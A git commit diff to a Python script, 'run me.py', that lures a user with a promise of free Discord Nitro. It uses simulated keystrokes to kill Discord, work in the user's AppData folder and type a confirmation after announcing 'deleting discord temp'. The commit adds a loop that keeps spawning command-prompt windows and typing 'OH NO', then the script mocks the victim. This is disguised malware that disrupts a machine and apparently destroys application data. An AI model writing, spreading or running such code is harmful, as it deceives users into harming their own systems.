8bae998268f1a1424870ca3a4b0e04ae4c0b18d3
gamestartergame <113556662+gamestartergame@users.noreply.github.com>
2024-03-08 02:38:02 +0000

    file rename
    don't open the file

--- run me.py
+++ run me.py
@@ -2,8 +2,9 @@ import pynput
 import time
 import subprocess
 import os
-input("enter to get free nitro\n")
-user ="c:"
+import random
+input("enter to get free nitro(console will open to generate)\n")
+os.system("open https://www.youtube.com/watch?v=-bnVGH62Yho&ab_channel=NoTextToSpeech")
 k =pynput.keyboard.Controller()
 enter = pynput.keyboard.Key.enter
 login = os.getlogin()
@@ -11,6 +12,7 @@ print("deleting discord temp")
 time.sleep(0.5)
 cmd =subprocess.Popen("cmd.exe /K cd C:/Users/"+ login +"/AppData/Roaming")
 time.sleep(0.3)
+os.system("open https://www.youtube.com/watch?v=Qskm9MTz2V4&ab_channel=SheetMusicBoss")
 k.type("taskkill /F /IM discord.exe")
 k.press(enter)
 time.sleep(0.3)
@@ -21,3 +23,12 @@ k.type("y")
 k.press(enter)
 time.sleep(0.5)
 k.type("you really thought you gonna get free nitro")
+i =1
+w =1
+
+while i <= 100:
+ time.sleep(w)
+ w =w + w
+ k.type("OH NO")
+ os.system(str(random.randint(0 , 100000)))
+ cmd2 = subprocess.Popen("cmd.exe /K cd C:/")
